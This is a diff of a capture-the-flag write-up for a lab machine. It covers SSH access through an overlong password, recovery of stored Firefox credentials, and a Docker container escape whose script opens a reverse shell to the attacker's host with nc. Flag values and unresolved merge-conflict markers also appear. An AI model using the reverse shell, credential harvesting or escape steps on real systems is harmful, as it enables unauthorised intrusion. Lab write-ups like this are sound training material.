@@ -17,7 +17,7 @@ layout: post
 
 ## Recon
 
-Firstly, I NMAP the whole IP with:
+Firstly, NMAP the whole IP with:
 ```bash
 nmap -sC -sV -Pn [ip]
 
@@ -44,27 +44,34 @@ We ssh to it on the alpine user with:
 ssh alpine@10.129.156.246
 ```
 then we use the password:
-```
+```plaintext
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```
 This password is 301 bytes, just enough to pass us by, and we get the login just like that.
 
-Doing ```ls -al``` we can see a .mozilla directory, following it to the end we get to a "logins.json" file:
-```
+Doing ```ls -al``` we can see a '.mozilla' directory, following it to the end we get to a 'logins.json' file:
+```json
 {"nextId":2,"logins":[{"id":1,"hostname":"http://172.17.0.1","httpRealm":"Zentara","formActionOrigin":null,"usernameField":"","passwordField":"","encryptedUsername":"Ym9i","encryptedPassword":"Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==","guid":"{a1b2c3d4-e5f6-7890-abcd-ef1234567890}","encType":0,"timeCreated":1730000000000,"timeLastUsed":1730900000000,"timePasswordChanged":1730000000000,"timesUsed":14}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
 ```
 
 where we find the B64 encoded user and pass:
-```
+```plaintext
 user: bob
 pass: CorrectHorseBatteryStaple
 ```
-There IS a user bob on the system, which means just ssh out and back in as bob with the given password. This works, now we can read "users.txt" in the bob home directory containing "f9e89987ee927c00c18a99a89f691045". And this is out first 32 bit hex user flag.
+There IS a user bob on the system, which means just ssh out and back in as bob with the given password. This works, now we can read `users.txt` in the bob home directory containing "f9e89987ee927c00c18a99a89f691045". And this is out first 32 bit hex user flag.
 
+<<<<<<< HEAD
 Next is the Docker part. We have to upload a file through http://[ip]/deploy that is named xz so that it overwrites the xz binary. Through the deploy, xz actually runs as root so we can open a remote shell. Looking up the CVE for Docker, we can find a PoC from [berdav](https://github.com/berdav) on [github](https://github.com/berdav/CVE-2026-41567/blob/main/test.sh) so we apply the exploit script here as well. We only need to make a few adjustments according to the specific container:
 1. With `mount` we check what sda partition we are on. In this case, it is /dev/sda4;
 2. The container doesn't have ncat, but it does have nc, specifically the busybox version. We need to place the `-e` flag at the end.
 3. We need to replace the ip with our own ip so the nc listener actually words, we also use         `nc -vnlp 50005` to listen for the remote shell.
+=======
+Next is the Docker part. We have to upload a file through http://[ip]/deploy that is named `xz` so that it overwrites the `xz` binary. Through the deploy, `xz` actually runs as root so we can open a remote shell. Looking up the CVE for Docker, we can find a PoC from [berdav](https://github.com/berdav) on [github](https://github.com/berdav/CVE-2026-41567/blob/main/test.sh) so we apply the exploit script here as well. We only need to make a few adjustments according to the specific container:
+1. With `mount` we check what `sda` partition we are on. In this case, it is `/dev/sda4;
+2. The container doesn't have `ncat`, but it does have `nc`, specifically the `busybox` version. We need to place the `-e` flag at the end.
+3. We need to replace the IP with our own IP so the `nc` listener actually words, we also use         `nc -vnlp 50005` to listen for the remote shell.
+>>>>>>> 1e4cec0 (Add writeup: DoubleTake)
 I used `tar -cJvf shell.tar.xz xz` for compressing the exploit to send it off, once its on the machine we can make changes to it using vi anyways so its not terrible if you make a mistake.
 
 This is the final script:
@@ -82,11 +89,10 @@ chroot /mnt cat /etc/hostname >>/tmp/e 2>>/tmp/e
 /usr/bin/nc [your local IP] "50005" -e '/bin/sh' 2>>/tmp/e
 ```
 
-The final flag is in /root/root.txt
+The final flag is in `/root/root.txt`
 <details markdown="1">
 <summary>Flag</summary>
 
-Target 1: f9e89987ee927c00c18a99a89f691045
-Target 2: 9db215c05df3efdf23a49354bc29d1d1
+	Target 1: f9e8...1045; Target 2: 9db2...d1d1
 
 </details>
